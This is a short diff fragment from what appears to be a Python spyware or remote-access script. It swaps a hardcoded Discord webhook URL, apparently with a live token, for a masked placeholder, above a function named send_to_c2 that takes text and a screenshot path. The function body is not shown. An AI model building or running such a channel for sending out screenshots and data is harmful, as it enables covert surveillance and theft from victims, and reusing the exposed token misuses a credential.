@@ -5,7 +5,7 @@ import sys
 import requests
 from datetime import datetime
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1508075291250130976/h--7D8fmlmqREBjDL32KjiMW7FxKqnTdQUs74anI8D-cf2QjE7Y-roooJKiO7MmNXBi8"
+WEBHOOK_URL = "https://discord.com/api/webhooks/#########################################"
 
 def send_to_c2(text=None, screenshot_path=None):
     try:
